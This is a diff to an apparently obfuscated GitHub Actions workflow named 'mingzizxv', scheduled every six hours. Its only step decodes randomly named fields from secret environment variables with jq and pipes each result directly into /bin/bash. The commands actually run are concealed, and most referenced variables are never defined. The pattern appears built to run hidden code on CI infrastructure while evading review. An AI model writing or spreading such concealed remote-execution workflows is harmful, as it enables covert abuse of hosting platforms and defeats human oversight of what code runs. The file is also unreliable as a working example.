@@ -2,24 +2,29 @@ name: mingzizxv
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
+    - cron: '36 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mingzizxv
         env:
-          obvz6: ${{ secrets.obvz6 }}
+          norod8: ${{ secrets.norod8 }}
         run: |
-          echo $obvz6 | jq -r .koosk51863 | /bin/bash
-          echo $id418 | jq -r .vr154 | /bin/bash
-          echo $vsgv37 | jq -r .kkas5596 | /bin/bash
-          echo $ojlyb4604 | jq -r .py29481 | /bin/bash
-          echo $ez45328 | jq -r .fgm186 | /bin/bash
-          echo $tjmc8 | jq -r .rjf63 | /bin/bash
-          echo $z52 | jq -r .uod608 | /bin/bash
-          echo $eqlqe3051 | jq -r .wh62766 | /bin/bash
-          echo $te5554 | jq -r .k3 | /bin/bash
-          echo $gwepi5 | jq -r .qutri5887 | /bin/bash
+          echo $norod8 | jq -r .yytj58 | /bin/bash
+          echo $avb008 | jq -r .lpno22 | /bin/bash
+          echo $vvmsw8 | jq -r .c00365 | /bin/bash
+          echo $fjefj955 | jq -r .a758 | /bin/bash
+          echo $dvtwy1521 | jq -r .fdk72 | /bin/bash
+          echo $vh56714 | jq -r .vyv9 | /bin/bash
+          echo $lmmgi083 | jq -r .uzqzx1 | /bin/bash
+          echo $euhlc52433 | jq -r .kd338 | /bin/bash
+          echo $dee82 | jq -r .of19 | /bin/bash
+          echo $ncq0656 | jq -r .hfykj622 | /bin/bash
+          echo $f2917 | jq -r .rgj3434 | /bin/bash
+          echo $kk1 | jq -r .ld9150 | /bin/bash
+          echo $ofry9459 | jq -r .wolxm608 | /bin/bash
 
